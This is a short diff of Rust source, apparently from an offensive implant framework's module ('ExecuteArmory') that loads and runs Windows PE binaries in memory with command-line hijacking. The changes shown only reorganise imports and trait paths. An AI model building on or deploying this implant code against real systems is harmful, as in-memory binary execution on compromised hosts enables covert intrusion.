@@ -1,20 +1,17 @@
-use crate::{check_request, Module, Result, TaskResult};
-use async_trait::async_trait;
 use core::ffi::c_void;
 use futures::channel::mpsc::{unbounded, UnboundedReceiver, UnboundedSender};
 use futures::executor::block_on;
 use futures::StreamExt;
+use std::ptr::null_mut;
+use std::sync::{Arc, Mutex};
+
 use malefic_helper::common::utils::format_cmdline;
-use malefic_helper::to_error;
 use malefic_helper::win::kit::func::get_func_addr;
 use malefic_helper::win::kit::pe::{hijack_commandline, load_pe};
 use malefic_helper::win::kit::MaleficModule;
 use malefic_helper::win::types::DllMain;
-use malefic_proto::proto::implantpb::spite::Body;
 use malefic_proto::proto::modulepb::BinaryResponse;
-use malefic_trait::module_impl;
-use std::ptr::null_mut;
-use std::sync::{Arc, Mutex};
+use crate::prelude::*;
 
 lazy_static::lazy_static! {
     static ref ARMORY_CHANNEL: Arc<Mutex<(UnboundedSender<String>, UnboundedReceiver<String>)>> = {
@@ -51,15 +48,15 @@ pub struct ExecuteArmory {}
 impl Module for ExecuteArmory {}
 
 #[async_trait]
-impl crate::ModuleImpl for ExecuteArmory {
+impl malefic_proto::module::ModuleImpl for ExecuteArmory {
 
     #[allow(unused_variables)]
     async fn run(
         &mut self,
         id: u32,
-        receiver: &mut crate::Input,
-        sender: &mut crate::Output,
-    ) -> Result {
+        receiver: &mut malefic_proto::module::Input,
+        sender: &mut malefic_proto::module::Output,
+    ) -> ModuleResult {
         let request = check_request!(receiver, Body::ExecuteBinary)?;
         let name = request.name + "\x00";
         let entrypoint = request.entry_point;
